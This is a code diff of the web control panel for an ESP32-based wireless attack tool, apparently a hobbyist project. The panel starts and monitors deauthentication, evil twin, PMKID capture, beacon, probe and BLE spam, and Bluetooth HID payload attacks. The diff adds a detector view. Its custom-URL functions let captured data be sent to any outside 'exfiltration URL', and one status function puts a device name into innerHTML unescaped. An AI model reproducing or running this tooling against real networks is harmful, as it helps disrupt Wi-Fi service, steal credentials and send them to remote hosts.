+/* ── Reset Attack ───────────────────────────────────── */
 function resetAttack() {
     stopProgressTimer();
-    stopBtStatusPoll();
-    document.getElementById("result-section").style.display        = "none";
-    document.getElementById("running-section").style.display       = "none";
-    document.getElementById("attack-config-section").style.display = "block";
+    document.getElementById("result-section").style.display         = "none";
+    document.getElementById("running-section").style.display        = "none";
+    document.getElementById("attack-config-section").style.display  = "block";
     selectedApElements = [];
     updateSelectedChips();
     updateSelectedCountBadge();
@@ -725,7 +637,7 @@ function resetAttack() {
     oReq.send();
 }
 
-/* ── Status polling ──────────────────────────────── */
+/* ── Status Polling ─────────────────────────────────── */
 function getStatus() {
     var oReq = new XMLHttpRequest();
     oReq.responseType = "arraybuffer";
@@ -749,8 +661,7 @@ function getStatus() {
         showResult(statusLabel, attack_type, content_size, content);
             }
     };
-
-    oReq.onerror = function () { /* ESP32 may be running an attack that cuts the management AP */ };
+    oReq.onerror = function () { /* ESP32 may be running an attack that cuts the AP */ };
     oReq.open("GET", "http://192.168.4.1/status", true);
     oReq.send();
 }
@@ -758,28 +669,33 @@ function getStatus() {
 function showRunning(attack_type) {
     setRunningVisible(true);
     setResultVisible(false);
-    var infoEl     = document.getElementById("running-attack-info");
+    var infoEl = document.getElementById("running-attack-info");
+    if (infoEl) infoEl.textContent = attackTypeName(attack_type);
+
     var beaconWrap = document.getElementById("beacon-timer-wrap");
     var simpleWrap = document.getElementById("simple-running-wrap");
     var btControls = document.getElementById("bt-payload-controls");
-
-    if (infoEl) infoEl.textContent = attackTypeName(attack_type);
 
     if (attack_type === AttackTypeEnum.ATTACK_TYPE_BT_PAYLOAD) {
         if (beaconWrap) beaconWrap.style.display = "none";
         if (simpleWrap) simpleWrap.style.display = "block";
         if (btControls) btControls.style.display = "block";
-        startBtStatusPoll();
     } else {
-        if (beaconWrap) beaconWrap.style.display = (attack_type === AttackTypeEnum.ATTACK_TYPE_BEACON_SPAM) ? "block" : "none";
-        if (simpleWrap) simpleWrap.style.display = (attack_type === AttackTypeEnum.ATTACK_TYPE_BEACON_SPAM) ? "none"  : "block";
+        if (beaconWrap) {
+            if (attack_type === AttackTypeEnum.ATTACK_TYPE_BEACON_SPAM) {
+                beaconWrap.style.display = "block";
+                simpleWrap.style.display = "none";
+            } else {
+                beaconWrap.style.display = "none";
+                simpleWrap.style.display = "block";
+            }
+        }
         if (btControls) btControls.style.display = "none";
     }
-
     switchTab("attack");
 }
 
-/* ── Error helpers ───────────────────────────────── */
+/* ── Error Helpers ──────────────────────────────────── */
 function showError(msg) {
     var el = document.getElementById("errors");
     el.textContent = msg;
@@ -787,82 +703,120 @@ function showError(msg) {
 }
 
 function hideError() {
-    var el = document.getElementById("errors");
-    el.style.display = "none";
+    document.getElementById("errors").style.display = "none";
 }
 
-/* ── Dialog ──────────────────────────────────────── */
+/* ── Dialog ─────────────────────────────────────────── */
 function showDialog(msg) {
     document.getElementById("dialog-msg").textContent = msg;
     document.getElementById("dialog-overlay").classList.remove("hidden");
 }
-
 function closeDialog() {
     document.getElementById("dialog-overlay").classList.add("hidden");
 }
 
+/* ── Detector ───────────────────────────────────────── */
+var detectedAlerts = {};
+var detectorPoll   = null;
 
-/* ── BT Payload helpers ──────────────────────────── */
-function setBtPayload(payload) {
-    fetch('/bt-payload-set', { method: 'POST', body: String(payload) })
-    .then(function (response) {
-        if (response.ok) showDialog("BT Payload changed to " + payload + ". Will take effect on next connection.");
-        else             showError("Failed to set payload.");
+function startDetector() {
+    fetch('http://192.168.4.1/detector/start', { method: 'POST' })
+    .then(function () {
+        document.getElementById('detector-status-text').textContent = 'MONITORING';
+        document.getElementById('detector-status-text').className   = 'det-status running';
+        document.getElementById('btn-det-start').disabled = true;
+        document.getElementById('btn-det-stop').disabled  = false;
+        document.getElementById('btn-det-clear').disabled = false;
+        var stateMsg = document.getElementById('detector-state-msg');
+        if (stateMsg) stateMsg.style.display = 'none';
+        detectorPoll = setInterval(pollDetector, 2000);
     })
-    .catch(function (err) { showError("Network error: " + err); });
+    .catch(function (err) { showError("Could not start detector: " + err); });
 }
 
-function setBtPayloadAndRun(payload) {
-    fetch('/bt-payload-set', { method: 'POST', body: String(payload) })
-    .then(function (res) {
-        if (res.ok) return fetch('/bt-payload-run', { method: 'POST' });
-        throw new Error("Failed to set payload");
+function stopDetector() {
+    fetch('http://192.168.4.1/detector/stop', { method: 'POST' })
+    .then(function () {
+        clearInterval(detectorPoll);
+        detectorPoll = null;
+        document.getElementById('detector-status-text').textContent = 'IDLE';
+        document.getElementById('detector-status-text').className   = 'det-status';
+        document.getElementById('btn-det-start').disabled = false;
+        document.getElementById('btn-det-stop').disabled  = true;
+        var stateMsg = document.getElementById('detector-state-msg');
+        if (stateMsg) {
+            stateMsg.style.display = 'block';
+            stateMsg.textContent   = 'Press START MONITOR to begin scanning';
+        }
     })
-    .then(function () { showDialog("Payload " + payload + " executed successfully."); })
-    .catch(function (err) { showError("Error: " + err); });
+    .catch(function (err) { showError("Could not stop detector: " + err); });
 }
 
-function runBtPayloadAgain() {
-    fetch('/bt-payload-run', { method: 'POST' })
-    .then(function (res) {
-        if (res.ok) showDialog("Re-running payload…");
-        else        showError("Could not re-run payload.");
-    })
-    .catch(function (err) { showError("Network error: " + err); });
+function clearAlerts() {
+    detectedAlerts = {};
+    var list = document.getElementById('detector-table-body');
+    list.innerHTML = '<tr><td colspan="3" class="table-empty-msg">No alerts yet</td></tr>';
+    document.getElementById('alert-count-badge').textContent = '0';
+    document.getElementById('btn-det-clear').disabled = true;
 }
 
-function startBtStatusPoll() {
-    if (btStatusTimer) return;
-    btStatusTimer = setInterval(updateBtStatus, 2000);
-}
-
-function stopBtStatusPoll() {
-    if (btStatusTimer) { clearInterval(btStatusTimer); btStatusTimer = null; }
-}
-
-function updateBtStatus() {
-    fetch('http://192.168.4.1/bt-status')
+function pollDetector() {
+    fetch('http://192.168.4.1/detector/status')
     .then(function (r) { return r.json(); })
     .then(function (data) {
-        var statusEl = document.getElementById("bt-connection-info");
-        var buttons  = document.querySelectorAll(".bt-payload-btn");
-        if (!statusEl) return;
-        if (data.connected) {
-            statusEl.textContent = "Connected: " + data.name + " (" + data.mac + ")";
-            statusEl.className   = "bt-info-connected";
-        } else {
-            statusEl.textContent = "Waiting for Bluetooth connection…";
-            statusEl.className   = "";
+        if (data.alerts && data.alerts.length > 0) {
+            for (var i = 0; i < data.alerts.length; i++) {
+                var a = data.alerts[i];
+                detectedAlerts[a.bssid] = a.count;
+            }
         }
-        buttons.forEach(function (btn) {
-            btn.disabled      = data.busy || !data.connected;
-            btn.style.opacity = (data.busy || !data.connected) ? "0.38" : "1";
-        });
+        var bssids     = Object.keys(detectedAlerts);
+        var alertCount = bssids.length;
+
+        document.getElementById('alert-count-badge').textContent  = alertCount;
+        document.getElementById('btn-det-clear').disabled = (alertCount === 0);
+
+        var list = document.getElementById('detector-table-body');
+        if (alertCount === 0) {
+            list.innerHTML = '<tr><td colspan="3" class="table-empty-msg">✓ No attacks detected</td></tr>';
+            return;
+        }
+        var rows = '';
+        for (var j = 0; j < bssids.length; j++) {
+            var bssid = bssids[j];
+            rows +=
+            '<tr>' +
+            '<td><code>' + escapeHtml(bssid) + '</code></td>' +
+            '<td>' + detectedAlerts[bssid] + '</td>' +
+            '<td style="color:var(--danger);font-weight:600;">HIGH</td>' +
+            '</tr>';
+        }
+        list.innerHTML = rows;
     })
-    .catch(function () {});
+    .catch(function () {
+        var list = document.getElementById('detector-table-body');
+        list.innerHTML = '<tr><td colspan="3" class="table-empty-msg">⚠ Connection lost (ESP32 disconnected?)</td></tr>';
+    });
 }
 
-/* ── Settings ────────────────────────────────────── */
+function setBtPayload(payload) {
+    fetch('/bt-payload-set', {
+        method: 'POST',
+        body: String(payload)
+    })
+    .then(function(response) {
+        if (response.ok) {
+            showDialog("BT Payload changed to " + payload + ". Will take effect on next connection.");
+        } else {
+            showError("Failed to set payload");
+        }
+    })
+    .catch(function(err) {
+        showError("Network error: " + err);
+    });
+}
+
+/* ── Settings ───────────────────────────────────────── */
 function saveSettings() {
     var ssid = document.getElementById('ap-ssid').value.trim();
     var pass = document.getElementById('ap-pass').value;
@@ -871,7 +825,8 @@ function saveSettings() {
         showDialog("SSID cannot be empty and password must be at least 8 characters.");
         return;
     }
-    if (!confirm("The device will restart. You will need to reconnect to the new network.")) return;
+
+    if (!confirm("The device will restart. You will need to reconnect to the new SSID.")) return;
 
     fetch('/save_settings', {
         method: 'POST',
@@ -879,94 +834,46 @@ function saveSettings() {
         body: 'ssid=' + encodeURIComponent(ssid) + '&pass=' + encodeURIComponent(pass)
     })
     .then(function (response) {
-        if (response.ok) showDialog("Settings saved. Reconnect to the new network after the device reboots.");
-        else             showDialog("Failed to save settings. Please try again.");
+        if (response.ok) {
+            showDialog("Settings saved. Wait 5–10 seconds for the ESP32 to reboot, then connect to the new network.");
+        } else {
+            showDialog("Failed to save settings. Please try again.");
+        }
     })
     .catch(function () {
         showDialog("Network error — the ESP32 may already be restarting.");
     });
 }
 
-/* ── Custom log URL ──────────────────────────────── */
-function toggleCustomUrl() {
-    var checkbox = document.getElementById("use-custom-url");
-    var row      = document.getElementById("custom-url-row");
-    row.style.display = checkbox.checked ? "block" : "none";
-    if (!checkbox.checked) {
-        fetch('/set-log-url', { method: 'POST', body: 'http://192.168.4.1/log' });
-    } else {
-        fetch('/get-log-url')
-        .then(function (r) { return r.json(); })
-        .then(function (data) {
-            if (data.url && data.url !== 'http://192.168.4.1/log') {
-                document.getElementById("custom-url").value = data.url;
-            }
-        })
-        .catch(function () {});
-    }
-}
-
-function saveCustomUrl() {
-    var url = document.getElementById("custom-url").value.trim();
-    if (!url) { showDialog("Please enter a valid URL."); return; }
-    if (!url.startsWith("http://") && !url.startsWith("https://")) {
-        showDialog("URL must start with http:// or https://"); return;
-    }
-    fetch('/set-log-url', { method: 'POST', body: url })
-    .then(function () { showDialog("Exfiltration URL saved."); })
-    .catch(function () { showError("Failed to save URL."); });
-}
-
-function loadCurrentUrl() {
-    fetch('/get-log-url')
-    .then(function (r) { return r.json(); })
-    .then(function (data) {
-        if (data.url && data.url !== 'http://192.168.4.1/log') {
-            document.getElementById("use-custom-url").checked              = true;
-            document.getElementById("custom-url").value                    = data.url;
-            document.getElementById("custom-url-row").style.display        = "block";
-        } else {
-            document.getElementById("use-custom-url").checked              = false;
-            document.getElementById("custom-url-row").style.display        = "none";
-        }
-    })
-    .catch(function () {});
-}
-
-/* ── Copy helper ─────────────────────────────────── */
+/* ── Copy Helper ────────────────────────────────────── */
 function copyText(elemId, btn) {
     var text = document.getElementById(elemId).textContent;
     if (navigator.clipboard && navigator.clipboard.writeText) {
         navigator.clipboard.writeText(text).then(function () {
             var orig = btn.textContent;
-            btn.textContent = "Copied!";
+            btn.textContent = "COPIED";
             setTimeout(function () { btn.textContent = orig; }, 1500);
         });
     } else {
         var ta = document.createElement("textarea");
         ta.value = text;
-        ta.style.cssText = "position:fixed;opacity:0;";
-        document.body.appendChild(ta);
-        ta.select();
-        document.execCommand("copy");
-        document.body.removeChild(ta);
+        ta.style.position = "fixed"; ta.style.opacity = "0";
+        document.body.appendChild(ta); ta.select(); document.execCommand("copy"); document.body.removeChild(ta);
         var orig = btn.textContent;
-        btn.textContent = "Copied!";
+        btn.textContent = "COPIED";
         setTimeout(function () { btn.textContent = orig; }, 1500);
     }
 }
 
-/* ── Utilities ───────────────────────────────────── */
+/* ── Utilities ──────────────────────────────────────── */
 function uint8ToHex(b) { return ("00" + b.toString(16)).slice(-2); }
-
 function escapeHtml(s) {
     return String(s)
-    .replace(/&/g,  "&amp;")
-    .replace(/</g,  "&lt;")
-    .replace(/>/g,  "&gt;")
-    .replace(/"/g,  "&quot;");
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;");
 }
-
 function attackTypeName(t) {
     switch (t) {
         case AttackTypeEnum.ATTACK_TYPE_PASSIVE:     return "Passive Capture";
@@ -974,11 +881,117 @@ function attackTypeName(t) {
         case AttackTypeEnum.ATTACK_TYPE_PMKID:       return "Clientless PMKID";
         case AttackTypeEnum.ATTACK_TYPE_DOS:         return "Deauthentication (DoS)";
         case AttackTypeEnum.ATTACK_TYPE_BEACON_SPAM: return "Beacon Spam";
-        case AttackTypeEnum.ATTACK_TYPE_PROBE:       return "Ghost Mode (Probe Spam)";
+        case AttackTypeEnum.ATTACK_TYPE_PROBE:       return "Probe Request Spam";
         case AttackTypeEnum.ATTACK_TYPE_EVIL_TWIN:   return "Evil Twin";
         case AttackTypeEnum.ATTACK_TYPE_BT_SPAM:     return "BLE Spam";
         case AttackTypeEnum.ATTACK_TYPE_CLONE:       return "Super Clone";
-        case AttackTypeEnum.ATTACK_TYPE_BT_PAYLOAD:  return "BT Payload (HID)";
+        case AttackTypeEnum.ATTACK_TYPE_BT_PAYLOAD:  return "BT Payload";
         default: return "Unknown (" + t + ")";
     }
 }
+
+function setBtPayloadAndRun(payload) {
+    fetch('/bt-payload-set', { method: 'POST', body: String(payload) })
+    .then(function(res) {
+        if (res.ok) {
+            return fetch('/bt-payload-run', { method: 'POST' });
+        } else {
+            throw new Error("Failed to set payload");
+        }
+    })
+    .then(function() {
+        showDialog("Payload " + payload + " executed");
+    })
+    .catch(function(err) {
+        showError("Error: " + err);
+    });
+}
+
+function runBtPayloadAgain() {
+    fetch('/bt-payload-run', { method: 'POST' })
+    .then(function(res) {
+        if (res.ok) showDialog("Re-running...");
+        else showError("Could not re-run");
+    })
+    .catch(function(err) { showError("Network error: " + err); });
+}
+
+function updateBtStatus() {
+    fetch('http://192.168.4.1/bt-status')
+    .then(r => r.json())
+    .then(data => {
+        const statusEl = document.getElementById("bt-connection-info");
+        const buttons = document.querySelectorAll(".bt-payload-btn");
+
+        if (data.connected) {
+            statusEl.innerHTML = `Connected to: <strong>${data.name}</strong> (${data.mac})`;
+            statusEl.style.color = "var(--success)";
+        } else {
+            statusEl.textContent = "Waiting for connection...";
+            statusEl.style.color = "var(--text-muted)";
+        }
+
+        // Grey out buttons if busy
+        buttons.forEach(btn => {
+            btn.disabled = data.busy || !data.connected;
+            btn.style.opacity = (data.busy || !data.connected) ? "0.5" : "1";
+        });
+    });
+}
+function toggleCustomUrl() {
+    var checkbox = document.getElementById("use-custom-url");
+    var row = document.getElementById("custom-url-row");
+    row.style.display = checkbox.checked ? "block" : "none";
+    if (!checkbox.checked) {
+        // Reset to default ESP32 endpoint
+        fetch('/set-log-url', { method: 'POST', body: 'http://192.168.4.1/log' });
+    } else {
+        // Optionally load previously saved URL
+        fetch('/get-log-url')
+        .then(r => r.json())
+        .then(data => {
+            if (data.url && data.url !== 'http://192.168.4.1/log') {
+                document.getElementById("custom-url").value = data.url;
+            }
+        })
+        .catch(() => {});
+    }
+}
+
+function saveCustomUrl() {
+    var url = document.getElementById("custom-url").value.trim();
+    if (!url) {
+        showDialog("Please enter a valid URL");
+        return;
+    }
+    // Basic URL validation
+    if (!url.startsWith("http://") && !url.startsWith("https://")) {
+        showDialog("URL must start with http:// or https://");
+        return;
+    }
+    fetch('/set-log-url', { method: 'POST', body: url })
+    .then(() => showDialog("Exfiltration URL saved"))
+    .catch(() => showError("Failed to save URL"));
+}
+
+// On page load, check current settings
+function loadCurrentUrl() {
+    fetch('/get-log-url')
+    .then(r => r.json())
+    .then(data => {
+        if (data.url && data.url !== 'http://192.168.4.1/log') {
+            document.getElementById("use-custom-url").checked = true;
+            document.getElementById("custom-url").value = data.url;
+            document.getElementById("custom-url-row").style.display = "block";
+        } else {
+            document.getElementById("use-custom-url").checked = false;
+            document.getElementById("custom-url-row").style.display = "none";
+        }
+    })
+    .catch(() => {});
+}
+
+
+
+// Add to your init or status poll
+setInterval(updateBtStatus, 2000);
